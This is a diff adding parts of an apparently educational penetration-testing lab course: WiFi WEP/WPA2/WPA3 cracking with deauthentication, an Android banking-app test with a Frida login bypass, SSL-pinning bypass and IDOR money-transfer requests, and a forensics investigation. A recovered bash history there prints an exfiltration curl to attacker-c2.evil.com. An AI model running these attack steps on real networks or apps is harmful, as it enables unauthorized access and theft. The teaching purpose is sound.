+sudo aircrack-ng wpa2_capture-01.cap
+
+# Output:
+# Opening wpa2_capture-01.cap
+# Reading packets, please wait...
+# 
+# 1 potential targets
+# 
+# # BSSID              ESSID          Encryption
+# 1 A2:B3:C4:D5:E6:F7  MyHomeWiFi     WPA (1 handshake)
+
+# Handshake confirmed!
+
+# Step 11: Crack with aircrack-ng (CPU-based)
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2_capture-01.cap
+
+# Output:
+#                       Aircrack-ng 1.6
+# 
+#       [00:05:42] 1847232/14344392 keys tested (5421.83 k/s)
+# 
+#       KEY FOUND! [ MySecurePassword2023! ]
+# 
+# Master Key: A1 B2 C3 D4 E5 F6 G7 H8 I9 J0 K1 L2 M3 N4 O5 P6
+# 
+# Transient Key: P1 O2 N3 M4 L5 K6 J7 I8 H9 G0 F1 E2 D3 C2 B1 A0
+
+# OR use hashcat (GPU-accelerated, MUCH faster)
+
+# Step 12: Convert to hashcat format
+hcxpcapngtool -o wpa2_hash.hc22000 wpa2_capture-01.cap
+
+# Step 13: Crack with hashcat
+hashcat -m 22000 wpa2_hash.hc22000 /usr/share/wordlists/rockyou.txt
+
+# Output:
+# Session..........: hashcat
+# Status...........: Cracked
+# Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
+# Hash.Target......: wpa2_hash.hc22000
+# Time.Started.....: Mon Jan 01 12:00:00 2024
+# Time.Estimated...: Mon Jan 01 12:03:42 2024 (3 mins 42 secs)
+# Kernel.Feature...: Pure Kernel
+# Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+# Speed.#1.........:   125.4 kH/s (95.42ms)
+# Recovered........: 1/1 (100.00%) Digests
+# Progress.........: 23456789/14344392 (163.55%)
+# 
+# A2B3C4D5E6F7:C1D2E3F4A5B6:A2B3C4D5E6F7:MyHomeWiFi:MySecurePassword2023!
+
+# 🎯 WPA2 cracked!
+
+# ==================================================
+# NETWORK 3: WPA3 ATTACK (DRAGONBLOOD)
+# ==================================================
+
+# Target: "SecureNetwork" (WPA3-SAE)
+# Modern, but vulnerable to Dragonblood attacks
+
+# Step 14: Scan for WPA3
+sudo airodump-ng wlan0mon | grep SAE
+
+# Output:
+# A3:B4:C5:D6:E7:F8  -52  12  2  0  1  54e  WPA3 CCMP SAE  SecureNetwork
+
+# Step 15: Capture SAE handshake
+sudo airodump-ng -c 1 --bssid A3:B4:C5:D6:E7:F8 -w wpa3_capture wlan0mon
+
+# Deauth client to capture handshake:
+sudo aireplay-ng -0 3 -a A3:B4:C5:D6:E7:F8 wlan0mon
+
+# Step 16: Dragonblood attack (timing-based)
+# Tool: dragonslayer
+git clone https://github.com/vanhoefm/dragonslayer.git
+cd dragonslayer
+
+# Run attack:
+./dragonslayer.py --interface wlan0mon --bssid A3:B4:C5:D6:E7:F8
+
+# This exploits timing leaks in SAE handshake
+# Attack reveals password character by character
+# Takes MUCH longer than WPA2 (hours to days)
+
+# Alternative: Downgrade attack
+# Some WPA3 routers support WPA2 fallback
+# Force AP to use WPA2, then crack normally
+
+# Tool: wpa_supplicant with sae_pwe=0
+# Forces transition mode → WPA2 handshake possible
+
+# Step 17: Convert WPA3 capture for hashcat
+# If downgrade successful:
+hcxpcapngtool -o wpa3_hash.hc22000 wpa3_capture-01.cap
+hashcat -m 22000 wpa3_hash.hc22000 rockyou.txt
+
+# ==================================================
+# CLEANUP & LESSONS LEARNED
+# ==================================================
+
+# Disable monitor mode:
+sudo airmon-ng stop wlan0mon
+
+# ✅ WEP: Completely broken, crack in minutes with enough IVs
+# ✅ WPA2: Dictionary attack, success depends on password strength
+# ✅ WPA3: Much harder, requires advanced attacks or misconfigurations
+# ✅ Deauth attacks: Force clients to reconnect, capture handshakes
+# ✅ GPU cracking: 100x faster than CPU for WPA2
+# ✅ Monitor mode: Essential for WiFi hacking (not all adapters support it!)
+# ✅ Legal warning: ONLY test networks you own or have permission!
+
+# Recommended WiFi adapters:
+# - ALFA AWUS036NHA (Atheros AR9271) - $40, excellent
+# - TP-Link TL-WN722N v1 (NOT v2/v3!) - Cheap, works great
+# - Panda PAU09 - Good for beginners
+# - ALFA AWUS1900 - Dual-band, expensive but powerful
+
+# Attack summary:
+# Network 1 (WEP): Captured 47,000 IVs → Cracked in 2 minutes
+# Network 2 (WPA2): Captured handshake → Cracked with hashcat in 3.5 minutes (weak password!)
+# Network 3 (WPA3): Downgrade → WPA2 → Cracked (or Dragonblood for days)
+
+# Time taken: ~3 hours
+# Difficulty: Beginner (WEP/WPA2), Intermediate (WPA3)</div>
+
+            <h3>Lab 4: Mobile Application Penetration Test (Android APK)</h3>
+
+            <div class="info-box">
+                <h4>📋 Lab Overview</h4>
+                <p><strong>Target:</strong> BankingApp.apk (fictional vulnerable banking app)<br>
+                <strong>Goal:</strong> Find hardcoded secrets, bypass authentication, exploit API endpoints<br>
+                <strong>Difficulty:</strong> Intermediate<br>
+                <strong>Skills tested:</strong> APK decompilation, code review, API testing, certificate pinning bypass<br>
+                <strong>Time estimate:</strong> 3-4 hours<br>
+                <strong>Tools used:</strong> apktool, jadx, ADB, Burp Suite, Frida, objection<br>
+                <strong>Requirements:</strong> Android device/emulator</p>
+            </div>
+
+            <div class="code"># ==================================================
+# PHASE 1: APK ACQUISITION & ANALYSIS
+# ==================================================
+
+# Scenario: Client provided BankingApp.apk for security assessment
+
+# Step 1: File information
+file BankingApp.apk
+
+# Output:
+# BankingApp.apk: Zip archive data, at least v2.0 to extract
+
+# APK is just a ZIP file!
+
+unzip -l BankingApp.apk | head -20
+
+# Output:
+# Archive:  BankingApp.apk
+#   Length      Date    Time    Name
+# ---------  ---------- -----   ----
+#      1234  2024-01-01 12:00   AndroidManifest.xml
+#     45678  2024-01-01 12:00   classes.dex
+#     12345  2024-01-01 12:00   resources.arsc
+#      5678  2024-01-01 12:00   res/drawable/icon.png
+#       890  2024-01-01 12:00   META-INF/MANIFEST.MF
+#       456  2024-01-01 12:00   META-INF/CERT.SF
+#      1234  2024-01-01 12:00   META-INF/CERT.RSA
+
+# Step 2: Decompile with apktool
+apktool d BankingApp.apk -o BankingApp_decompiled
+
+# Output:
+# I: Using Apktool 2.7.0
+# I: Loading resource table...
+# I: Decoding AndroidManifest.xml with resources...
+# I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
+# I: Regular manifest package...
+# I: Decoding file-resources...
+# I: Decoding values */* XMLs...
+# I: Baksmaling classes.dex...
+# I: Copying assets and libs...
+# I: Copying unknown files...
+# I: Copying original files...
+
+cd BankingApp_decompiled
+ls
+
+# Output:
+# AndroidManifest.xml
+# apktool.yml
+# original/
+# res/
+# smali/          ← Smali bytecode (hard to read)
+# unknown/
+
+# Step 3: Decompile to Java with jadx
+jadx BankingApp.apk -d BankingApp_java
+
+# Output:
+# INFO  - loading ...
+# INFO  - processing ...
+# INFO  - done
+
+cd BankingApp_java
+ls
+
+# Output:
+# resources/
+# sources/        ← Java source code!
+
+cd sources/com/example/bankingapp
+
+ls
+
+# Output:
+# MainActivity.java
+# LoginActivity.java
+# TransferActivity.java
+# ApiClient.java
+# Utils.java
+# Constants.java
+
+# ==================================================
+# PHASE 2: STATIC ANALYSIS (CODE REVIEW)
+# ==================================================
+
+# Step 4: Examine AndroidManifest.xml
+cat ../../../BankingApp_decompiled/AndroidManifest.xml
+
+# Key findings:
+# <uses-permission android:name="android.permission.INTERNET" />
+# <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+# <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+# 
+# <activity android:name=".MainActivity" android:exported="true">
+# <activity android:name=".LoginActivity">
+# <activity android:name=".SecretActivity" android:exported="false">
+# 
+# <service android:name=\".BackgroundService\" android:exported=\"true\">
+
+# ⚠️ Exported activities: Accessible from other apps!
+# ⚠️ BackgroundService exported: Can be called externally!
+# ⚠️ External storage permissions: Potential data leakage
+
+# Step 5: Search for hardcoded secrets
+grep -r "password" . | grep -v ".git"
+
+# Output:
+# ./Constants.java:    public static final String DEFAULT_PASSWORD = \"admin123\";
+# ./Utils.java:        String password = \"hardcoded_api_key_abc123xyz\";
+# ./ApiClient.java:    private static final String API_KEY = \"sk_live_abc123def456\";
+
+# 🎯 Found hardcoded credentials!
+
+cat Constants.java
+
+# Output:
+package com.example.bankingapp;
+
+public class Constants {
+    public static final String API_BASE_URL = \"https://api.bankingapp.com/v1/\";
+    public static final String DEFAULT_USERNAME = \"admin\";
+    public static final String DEFAULT_PASSWORD = \"admin123\";
+    public static final String ENCRYPTION_KEY = \"MyS3cr3tK3y!2024\";
+    public static final boolean DEBUG_MODE = true;  # ← Debug enabled in production!
+}
+
+# Step 6: Examine authentication logic
+cat LoginActivity.java
+
+# Simplified code:
+public class LoginActivity extends AppCompatActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_login);
+        
+        Button loginButton = findViewById(R.id.loginButton);
+        loginButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                String username = usernameField.getText().toString();
+                String password = passwordField.getText().toString();
+                
+                // ⚠️ Client-side authentication!
+                if (username.equals(\"admin\") && password.equals(\"admin123\")) {
+                    Intent intent = new Intent(LoginActivity.this, MainActivity.class);
+                    startActivity(intent);
+                } else {
+                    Toast.makeText(LoginActivity.this, \"Invalid credentials\", Toast.LENGTH_SHORT).show();
+                }
+            }
+        });
+    }
+}
+
+# 🚨 CRITICAL: Authentication done client-side!
+# No server validation, credentials hardcoded
+
+# Step 7: Find API endpoints
+cat ApiClient.java
+
+# Output:
+public class ApiClient {
+    private static final String API_BASE_URL = \"https://api.bankingapp.com/v1/\";
+    private static final String API_KEY = \"sk_live_abc123def456\";
+    
+    public void getBalance(String accountId) {
+        String url = API_BASE_URL + \"balance/\" + accountId;
+        // GET request without authentication
+    }
+    
+    public void transfer(String from, String to, double amount) {
+        String url = API_BASE_URL + \"transfer\";
+        JSONObject body = new JSONObject();
+        body.put(\"from\", from);
+        body.put(\"to\", to);
+        body.put(\"amount\", amount);
+        body.put(\"api_key\", API_KEY);  # ← API key in request body!
+        // POST request
+    }
+    
+    public void adminPanel() {
+        String url = API_BASE_URL + \"admin/users\";
+        // Hidden admin endpoint!
+    }
+}
+
+# 🎯 Found API endpoints:
+# - /v1/balance/:accountId
+# - /v1/transfer
+# - /v1/admin/users
+
+# ==================================================
+# PHASE 3: DYNAMIC ANALYSIS (RUNTIME TESTING)
+# ==================================================
+
+# Step 8: Install APK on device/emulator
+adb devices
+
+# Output:
+# List of devices attached
+# emulator-5554  device
+
+adb install BankingApp.apk
+
+# Output:
+# Performing Streamed Install
+# Success
+
+# Step 9: Launch app
+adb shell am start -n com.example.bankingapp/.LoginActivity
+
+# App opens on device!
+
+# Step 10: Intercept traffic with Burp Suite
+
+# A) Configure device proxy:
+adb shell settings put global http_proxy 192.168.1.10:8080
+
+# B) Install Burp CA certificate on device:
+# Export Burp cert: Proxy → Options → Export CA certificate → DER format
+# Convert to PEM:
+openssl x509 -inform DER -in burp_cert.der -out burp_cert.pem
+
+# Calculate hash:
+openssl x509 -inform PEM -subject_hash_old -in burp_cert.pem | head -1
+# Output: 9a5ba575
+
+# Rename:
+mv burp_cert.pem 9a5ba575.0
+
+# Push to device:
+adb root
+adb remount
+adb push 9a5ba575.0 /system/etc/security/cacerts/
+adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
+adb reboot
+
+# C) Burp Suite should now intercept app traffic!
+
+# Step 11: Test hardcoded bypass
+# Try logging in with admin:admin123
+
+# Burp intercepts:
+POST /v1/login HTTP/1.1
+Host: api.bankingapp.com
+Content-Type: application/json
+
+{
+    \"username\": \"admin\",
+    \"password\": \"admin123\"
+}
+
+# But wait - earlier code showed client-side auth!
+# App doesn't even send login request to server
+# Just checks credentials locally
+
+# Bypass:
+# Option 1: Patch APK to skip login check
+# Option 2: Use Frida to hook authentication method
+
+# ==================================================
+# PHASE 4: FRIDA HOOKING (BYPASS AUTHENTICATION)
+# ==================================================
+
+# Step 12: Install Frida
+pip3 install frida-tools
+
+# Download frida-server for Android:
+wget https://github.com/frida/frida/releases/download/16.0.19/frida-server-16.0.19-android-x86_64.xz
+unxz frida-server-16.0.19-android-x86_64.xz
+mv frida-server-16.0.19-android-x86_64 frida-server
+
+# Push to device:
+adb push frida-server /data/local/tmp/
+adb shell chmod 755 /data/local/tmp/frida-server
+
+# Run frida-server:
+adb shell "/data/local/tmp/frida-server &"
+
+# Step 13: List running apps
+frida-ps -U
+
+# Output:
+#   PID  Name
+# -----  ----
+#  1234  com.example.bankingapp
+#  5678  com.android.systemui
+
+# Step 14: Create Frida script to bypass authentication
+cat > bypass_auth.js <<'EOF'
+Java.perform(function() {
+    console.log("[*] Starting authentication bypass script...");
+    
+    // Hook LoginActivity.onClick method
+    var LoginActivity = Java.use(\"com.example.bankingapp.LoginActivity\");
+    
+    LoginActivity.onClick.implementation = function(view) {
+        console.log(\"[*] onClick method called!\");
+        console.log(\"[*] Bypassing authentication check...\");
+        
+        // Always authenticate successfully
+        var Intent = Java.use(\"android.content.Intent\");
+        var intent = Intent.$new(this.context, Java.use(\"com.example.bankingapp.MainActivity\").class);
+        this.startActivity(intent);
+        
+        console.log(\"[+] Authentication bypassed! Redirecting to MainActivity\");
+    };
+    
+    console.log(\"[+] Hook installed successfully!\");
+});
+EOF
+
+# Step 15: Run Frida script
+frida -U -f com.example.bankingapp -l bypass_auth.js --no-pause
+
+# Output:
+# [*] Starting authentication bypass script...
+# [+] Hook installed successfully!
+
+# Now try logging in with ANY credentials → Always works!
+
+# ==================================================
+# PHASE 5: API TESTING
+# ==================================================
+
+# Step 16: Test balance endpoint
+# From ApiClient.java: GET /v1/balance/:accountId
+
+curl -X GET "https://api.bankingapp.com/v1/balance/1001" \\
+     -H "X-API-Key: sk_live_abc123def456"
+
+# Response:
+{
+    \"account_id\": \"1001\",
+    \"balance\": 5000.00,
+    \"currency\": \"USD\"
+}
+
+# ✅ API accepts hardcoded key!
+
+# Step 17: Test IDOR (Insecure Direct Object Reference)
+# Try accessing other users' balances:
+curl -X GET "https://api.bankingapp.com/v1/balance/1002" \\
+     -H "X-API-Key: sk_live_abc123def456"
+
+# Response:
+{
+    \"account_id\": \"1002\",
+    \"balance\": 10000.00,
+    \"currency\": \"USD\"
+}
+
+# 🚨 CRITICAL: Can view any user's balance!
+
+# Step 18: Test transfer endpoint
+curl -X POST "https://api.bankingapp.com/v1/transfer" \\
+     -H "Content-Type: application/json" \\
+     -d '{
+       \"from\": \"1002\",
+       \"to\": \"1001\",
+       \"amount\": 1000,
+       \"api_key\": \"sk_live_abc123def456\"
+     }'
+
+# Response:
+{
+    \"status\": \"success\",
+    \"transaction_id\": \"TXN123456\",
+    \"message\": \"Transfer completed\"
+}
+
+# 🚨 CRITICAL: Can transfer money from ANY account!
+# No validation of account ownership
+
+# Step 19: Test admin endpoint
+curl -X GET "https://api.bankingapp.com/v1/admin/users" \\
+     -H "X-API-Key: sk_live_abc123def456"
+
+# Response:
+{
+    \"users\": [
+        {\"id\": 1001, \"username\": \"user1\", \"email\": \"user1@example.com\"},
+        {\"id\": 1002, \"username\": \"user2\", \"email\": \"user2@example.com\"},
+        {\"id\": 1003, \"username\": \"admin\", \"email\": \"admin@bankingapp.com\"}
+    ]
+}
+
+# 🚨 CRITICAL: Admin endpoint accessible with regular API key!
+
+# ==================================================
+# PHASE 6: CERTIFICATE PINNING BYPASS
+# ==================================================
+
+# Some apps implement certificate pinning:
+# App only trusts specific SSL certificates
+# Prevents MITM attacks (Burp Suite interception)
+
+# Step 20: Check for certificate pinning
+# Look in decompiled code for:
+# - OkHttp CertificatePinner
+# - TrustManager implementations
+# - SSL pinning keywords
+
+grep -r "CertificatePinner" BankingApp_java/sources/
+
+# Found in NetworkModule.java:
+CertificatePinner certificatePinner = new CertificatePinner.Builder()
+    .add(\"api.bankingapp.com\", \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\")
+    .build();
+
+# Certificate pinning detected!
+
+# Step 21: Bypass with Frida + objection
+pip3 install objection
+
+# Launch app with objection:
+objection -g com.example.bankingapp explore
+
+# Inside objection:
+android sslpinning disable
+
+# Output:
+# (agent) [3r4nklgt1o7] Custom TrustManager ready
+# (agent) [3r4nklgt1o7] Hooking OkHTTP3
+# (agent) [3r4nklgt1o7] Hooking Apache HttpClient
+# (agent) [3r4nklgt1o7] Hooking WebView
+# (agent) Monitoring SSL pinning
+
+# Now Burp Suite intercepts traffic even with pinning!
+
+# ==================================================
+# PHASE 7: REPORT FINDINGS
+# ==================================================
+
+# Critical vulnerabilities found:
+
+# 1. ⚠️ CRITICAL - Hardcoded Credentials
+#    Location: Constants.java
+#    Impact: Default admin credentials exposed
+#    Fix: Remove hardcoded credentials, use secure storage
+
+# 2. ⚠️ CRITICAL - Client-Side Authentication
+#    Location: LoginActivity.java
+#    Impact: Authentication bypass via code modification/Frida
+#    Fix: Implement server-side authentication
+
+# 3. ⚠️ CRITICAL - Hardcoded API Key
+#    Location: ApiClient.java, Utils.java
+#    Impact: API key compromise, unauthorized access
+#    Fix: Use secure key storage (Android Keystore)
+
+# 4. ⚠️ CRITICAL - IDOR Vulnerability
+#    Endpoints: /v1/balance/:id, /v1/transfer
+#    Impact: Access any user's data, unauthorized transfers
+#    Fix: Implement proper authorization checks
+
+# 5. ⚠️ HIGH - Exposed Admin Endpoint
+#    Endpoint: /v1/admin/users
+#    Impact: User enumeration, privilege escalation
+#    Fix: Add admin-specific authentication
+
+# 6. ⚠️ MEDIUM - Debug Mode Enabled
+#    Location: Constants.java
+#    Impact: Verbose logging may expose sensitive data
+#    Fix: Disable debug mode in production builds
+
+# 7. ⚠️ MEDIUM - Excessive Permissions
+#    Location: AndroidManifest.xml
+#    Impact: Unnecessary access to external storage
+#    Fix: Remove unused permissions
+
+# 8. ⚠️ LOW - Certificate Pinning Present (but bypassable)
+#    Location: NetworkModule.java
+#    Impact: Can be bypassed with Frida
+#    Fix: Implement root/tamper detection
+
+# ==================================================
+# LESSONS LEARNED
+# ==================================================
+
+# ✅ APK = ZIP file, easily decompilable
+# ✅ Always check for hardcoded secrets (grep -r \"password\", \"api_key\", \"secret\")
+# ✅ Client-side checks are NOT security controls
+# ✅ Frida = Powerful for runtime manipulation
+# ✅ Certificate pinning can be bypassed (objection, Frida, Xposed)
+# ✅ IDOR vulnerabilities common in mobile APIs
+# ✅ Mobile apps often have weaker security than web apps
+# ✅ Always test both static (code) and dynamic (runtime) analysis
+
+# Mobile security checklist:
+# ☐ Decompile APK (apktool, jadx)
+# ☐ Search for hardcoded secrets
+# ☐ Review AndroidManifest.xml permissions
+# ☐ Check for exported components
+# ☐ Test authentication/authorization
+# ☐ Intercept network traffic (Burp Suite)
+# ☐ Test API endpoints (Postman, curl)
+# ☐ Check for IDOR/BOLA vulnerabilities
+# ☐ Test certificate pinning bypass
+# ☐ Check for root detection (if present, bypass)
+# ☐ Test data storage (SharedPreferences, SQLite databases)
+# ☐ Review WebView implementations
+# ☐ Test for insecure data storage
+
+# Time taken: ~4 hours
+# Difficulty: Intermediate (requires Android knowledge)</div>
+
+            <h3>Lab 5: Complete Forensics Investigation (Digital Evidence Analysis)</h3>
+
+            <div class="info-box">
+                <h4>📋 Lab Overview</h4>
+                <p><strong>Target:</strong> Disk image from compromised system<br>
+                <strong>Goal:</strong> Determine how attacker gained access, what was stolen, establish timeline<br>
+                <strong>Difficulty:</strong> Intermediate<br>
+                <strong>Skills tested:</strong> Disk forensics, memory analysis, timeline creation, artifact analysis<br>
+                <strong>Time estimate:</strong> 4-5 hours<br>
+                <strong>Tools used:</strong> Autopsy, Volatility, Sleuthkit, ExifTool, Wireshark, Timeline Explorer<br>
+                <strong>Requirements:</strong> Disk image (compromised_system.dd), memory dump (memory.raw)</p>
+            </div>
+
+            <div class="code"># ==================================================
+# SCENARIO: INCIDENT RESPONSE
+# ==================================================
+
+# Call received: "Our employee's laptop was compromised. We isolated it
+# and created a disk image + memory dump. Need to know:
+#   1. How did attacker get in?
+#   2. What data was accessed/exfiltrated?
+#   3. Is attacker still present?"
+
+# Files provided:
+# - compromised_system.dd (100GB disk image)
+# - memory.raw (8GB memory dump)
+# - network_capture.pcap (packet capture during incident)
+
+# Timeline: System compromised on 2024-01-15, discovered on 2024-01-18
+
+# ==================================================
+# PHASE 1: DISK IMAGE ANALYSIS
+# ==================================================
+
+# Step 1: Verify image integrity
+sha256sum compromised_system.dd
+
+# Output:
+# abc123def456...  compromised_system.dd
+
+# Document hash for evidence chain of custody
+
+# Step 2: Mount image (read-only!)
+sudo mkdir /mnt/evidence
+sudo mount -o ro,loop,noexec compromised_system.dd /mnt/evidence
+
+# Step 3: Initial reconnaissance
+ls -la /mnt/evidence
+
+# Output:
+# bin/
+# boot/
+# dev/
+# etc/
+# home/
+# usr/
+# var/
+# 
+# Looks like Linux system (Ubuntu)
+
+# Check OS version:
+cat /mnt/evidence/etc/os-release
+
+# Output:
+# NAME=\"Ubuntu\"
+# VERSION=\"22.04.1 LTS\"
+# ID=ubuntu
+
+# Step 4: Identify users
+cat /mnt/evidence/etc/passwd | grep -v nologin
+
+# Output:
+# root:x:0:0:root:/root:/bin/bash
+# jsmith:x:1000:1000:John Smith:/home/jsmith:/bin/bash
+
+# Primary user: jsmith (UID 1000)
+
+# ==================================================
+# PHASE 2: TIMELINE CREATION
+# ==================================================
+
+# Step 5: Create comprehensive timeline
+# (MACB times: Modified, Accessed, Changed, Birth)
+
+fls -r -m / /mnt/evidence > timeline_bodyfile.txt
+
+# Parse with mactime:
+mactime -b timeline_bodyfile.txt -d > timeline_full.csv
+
+# Filter to incident window (2024-01-15 to 2024-01-18):
+grep "2024-01-1[5-8]" timeline_full.csv > timeline_incident.csv
+
+# Step 6: Analyze timeline with Timeline Explorer
+# (Import timeline_incident.csv into Timeline Explorer or Excel)
+
+# Key findings from timeline:
+# 2024-01-15 14:23:15 - /home/jsmith/Downloads/invoice.pdf.exe (CREATED)
+# 2024-01-15 14:24:03 - /home/jsmith/Downloads/invoice.pdf.exe (EXECUTED)
+# 2024-01-15 14:24:15 - /tmp/.hidden_backdoor (CREATED)
+# 2024-01-15 14:24:18 - /home/jsmith/.bash_history (MODIFIED)
+# 2024-01-15 14:25:00 - /var/log/auth.log (MODIFIED)
+# 2024-01-15 14:30:12 - /home/jsmith/Documents/*.docx (ACCESSED)
+# 2024-01-15 14:35:45 - /home/jsmith/Documents/exfil.zip (CREATED)
+# 2024-01-15 14:36:12 - /var/log/syslog (MODIFIED)
+
+# 🎯 Initial vector: invoice.pdf.exe (malicious executable)
+
+# ==================================================
+# PHASE 3: MALWARE ANALYSIS
+# ==================================================
+
+# Step 7: Extract malicious file
+cp /mnt/evidence/home/jsmith/Downloads/invoice.pdf.exe malware_sample.exe
+
+# NEVER run unknown executables!
+
+# Step 8: Basic static analysis
+file malware_sample.exe
+
+# Output:
+# malware_sample.exe: ELF 64-bit LSB executable, x86-64
+
+# It's a Linux binary (not Windows .exe despite extension!)
+
+strings malware_sample.exe | grep -i http
+
+# Output:
+# http://attacker-c2.evil.com:4444
+# POST /upload
+# GET /command
+
+# 🎯 C2 server: attacker-c2.evil.com:4444
+
+# Check for packing/obfuscation:
+upx -t malware_sample.exe
+
+# Output:
+# upx: malware_sample.exe: NotPackedException: not packed by UPX
+
+# Not UPX-packed
+
+# Calculate hashes:
+md5sum malware_sample.exe
+sha256sum malware_sample.exe
+
+# Check VirusTotal:
+# (Upload hashes, not file itself to avoid leaking evidence)
+# Or use API:
+curl -X POST 'https://www.virustotal.com/vtapi/v2/file/report' \\
+     -d apikey=YOUR_API_KEY \\
+     -d resource=SHA256_HASH
+
+# Step 9: Dynamic analysis (sandbox)
+# Upload to any.run, hybrid-analysis.com, or local Cuckoo sandbox
+
+# Findings from sandbox:
+# - Connects to attacker-c2.evil.com:4444
+# - Creates /tmp/.hidden_backdoor
+# - Modifies .bash_history (anti-forensics)
+# - Searches for document files
+# - Compresses documents into exfil.zip
+# - Attempts to upload exfil.zip to C2
+
+# ==================================================
+# PHASE 4: USER ACTIVITY ANALYSIS
+# ==================================================
+
+# Step 10: Check bash history
+cat /mnt/evidence/home/jsmith/.bash_history
+
+# Output:
+# cd Downloads
+# ls -la
+# chmod +x invoice.pdf.exe
+# ./invoice.pdf.exe  # ← User executed malware!
+# # Attacker commands below:
+# whoami
+# id
+# uname -a
+# cat /etc/passwd
+# find /home -name "*.docx" -o -name "*.pdf"
+# zip -r /home/jsmith/Documents/exfil.zip /home/jsmith/Documents/
+# curl -X POST -F "file=@/home/jsmith/Documents/exfil.zip" http://attacker-c2.evil.com:4444/upload
+# rm exfil.zip
+# history -c  # ← Attempted to clear history (didn't work completely)
+
+# 🎯 Attacker commands documented!
+
+# Step 11: Check browser history
+# Firefox:
+sqlite3 /mnt/evidence/home/jsmith/.mozilla/firefox/*/places.sqlite \\
+    "SELECT datetime(visit_date/1000000,'unixepoch'), url FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id ORDER BY visit_date DESC LIMIT 20;"
+
+# Output:
+# 2024-01-15 14:20:00|https://mail.google.com
+# 2024-01-15 14:21:35|https://drive.google.com/file/d/abc123/download  # ← Malware download
+# 2024-01-15 14:22:15|https://github.com
+# ...
+
+# 🎯 Malware downloaded from Google Drive link!
+
+# Step 12: Check email
+# (Requires email client data or webmail analysis)
+
+# If Thunderbird:
+grep -r "invoice" /mnt/evidence/home/jsmith/.thunderbird/
+
+# Or extract from mail spool:
+strings /mnt/evidence/var/mail/jsmith | grep -A 10 "Subject: Invoice"
+
+# Email found:
+# From: finance@fake-vendor.com
+# To: jsmith@company.com
+# Subject: URGENT: Unpaid Invoice #12345
+# 
+# Dear John,
+# 
+# Your account has an unpaid invoice. Please review the attached invoice immediately.
+# 
+# Download invoice: https://drive.google.com/file/d/abc123/download
+# 
+# Regards,
+# Finance Department
+
+# 🎯 Phishing email → User clicked malicious link
+
+# ==================================================
+# PHASE 5: NETWORK TRAFFIC ANALYSIS
+# ==================================================
+
+# Step 13: Analyze packet capture
+wireshark network_capture.pcap &
+
+# Or CLI with tshark:
+tshark -r network_capture.pcap -Y "http" -T fields -e frame.time -e ip.src -e ip.dst -e http.request.uri
+
+# Findings:
+# 2024-01-15 14:24:05  10.0.0.50  185.123.45.67  GET /payload.bin
+# 2024-01-15 14:24:15  10.0.0.50  185.123.45.67  POST /register
+# 2024-01-15 14:30:00  10.0.0.50  185.123.45.67  GET /command
+# 2024-01-15 14:35:50  10.0.0.50  185.123.45.67  POST /upload (2.3MB)
+
+# 185.123.45.67 = attacker-c2.evil.com
+
+# Step 14: Extract uploaded file from PCAP
+tshark -r network_capture.pcap -Y "http.request.method == POST and http.request.uri == /upload" -T fields -e http.file_data | xxd -r -p > recovered_exfil.zip
+
+# Verify:
+file recovered_exfil.zip
+# Output: Zip archive data
+
+unzip -l recovered_exfil.zip
+
+# Output:
+# Archive:  recovered_exfil.zip
+#   Length      Date    Time    Name
+# ---------  ---------- -----   ----
+#    123456  2024-01-15 14:35   Q4_Financial_Report.docx
+#     45678  2024-01-15 14:35   Customer_Database.xlsx
+#     78901  2024-01-15 14:35   Employee_SSNs.pdf
+#      3456  2024-01-15 14:35   Company_Secrets.txt
+
+# 🎯 CRITICAL: Sensitive company data exfiltrated!
+
+# ==================================================
+# PHASE 6: MEMORY ANALYSIS
+# ==================================================
+
+# Step 15: Analyze memory dump with Volatility
+volatility3 -f memory.raw windows.info
+
+# Wait, error: "Unable to find Windows structures"
+
+# Try Linux:
+volatility3 -f memory.raw linux.bash
+
+# Output:
+# Pid    Process              CommandTime                 Command
+# 1234   bash                 2024-01-15 14:24:03         ./invoice.pdf.exe
+# 1234   bash                 2024-01-15 14:25:15         whoami
+# 1234   bash                 2024-01-15 14:26:00         find /home -name "*.docx"
+
+# ✅ Confirmed attacker commands in memory
+
+# Step 16: Extract network connections
+volatility3 -f memory.raw linux.pslist
+
+# Output:
+# PID  PPID  COMM
+# 1234 1000  bash
+# 5678 1234  .hidden_backdoor
+
+# Process 5678 = Backdoor!
+
+volatility3 -f memory.raw linux.netstat
+
+# Output:
+# Proto  Local Address       Foreign Address     State       PID
+# TCP    10.0.0.50:45123     185.123.45.67:4444  ESTABLISHED 5678
+
+# ✅ Active C2 connection at time of memory capture!
+
+# Step 17: Dump suspicious process
+volatility3 -f memory.raw -o /tmp/dump linux.proc.Maps --pid 5678
+
+# Extract binary:
+volatility3 -f memory.raw linux.elfdump --pid 5678 -o /tmp/dump
+
+# Compare with disk artifact:
+diff /tmp/.hidden_backdoor /tmp/dump/5678.elf
+
+# ✅ Same backdoor running in memory
+
+# ==================================================
+# PHASE 7: PERSISTENCE MECHANISMS
+# ==================================================
+
+# Step 18: Check for persistence
+# Common locations:
+
+# Cron jobs:
+cat /mnt/evidence/var/spool/cron/crontabs/jsmith
+
+# Output:
+# @reboot /tmp/.hidden_backdoor &  # ← Persistence!
+
+# Systemd services:
+ls /mnt/evidence/etc/systemd/system/
+
+# Output:
+# backdoor.service  # ← Found malicious service!
+
+cat /mnt/evidence/etc/systemd/system/backdoor.service
+
+# Output:
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+ExecStart=/tmp/.hidden_backdoor
+Restart=always
+User=root  # ← Running as root!
+
+[Install]
+WantedBy=multi-user.target
+
+# 🚨 CRITICAL: Backdoor configured to run as root at boot!
+
+# SSH keys:
+cat /mnt/evidence/home/jsmith/.ssh/authorized_keys
+
+# Output:
+# (Normal keys...)
+# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil  # ← Attacker's SSH key!
